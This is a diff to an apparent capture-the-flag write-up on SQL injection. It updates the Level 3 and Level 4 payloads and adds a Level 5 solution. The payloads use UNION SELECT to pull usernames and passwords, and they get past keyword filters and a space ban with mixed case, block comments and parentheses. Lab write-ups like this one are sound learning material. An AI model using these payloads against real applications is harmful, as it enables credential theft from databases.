@@ -84,7 +84,9 @@ Level 3
   password) we ca can grab the fields and get the flag:
 
     greatest%' UNUNIONION (SESELECTLECT users.username, users.password,3 FROM 
-      users);-- %';
+      users);#
+
+  Note that we finish with '#' which in mySQL comments out the entire line.
 
 Solution:----------------------------------------------------------------------
   greatest%' UNunionION (SEselectLECT users.username, users.password,3 FROM 
@@ -112,9 +114,22 @@ Level 4
   UniON and SElect).
 
 Solution:----------------------------------------------------------------------
-  greatest%' UniON (SElect users.username, users.password,3 FROM  users);-- 
-      %';
+  greatest%' UniON (SElect users.username, users.password,3 FROM  users);# 
 
 ###############################################################################
 Level 5
 ##############################################################################
+  In this level, they tried to ban spaces in all queries:
+
+    if (isset($_GET['q'])) {
+        // Ban space character
+        if (strpos($_GET['q'], " ") !== false) die("Hacker detected"); 
+    }
+
+  SQL allows paranthetical grouping, so whenever a SQL command occurs, we
+  can replace the space with a parenthessis. Where there isn't a command
+  we can use block comments. And finally for the finally comment everthing
+  after our importnat query with #.
+Solution:----------------------------------------------------------------------
+    %'/**/UNION(SELECT(users.username),(users.password),(3)FROM(users));#
+
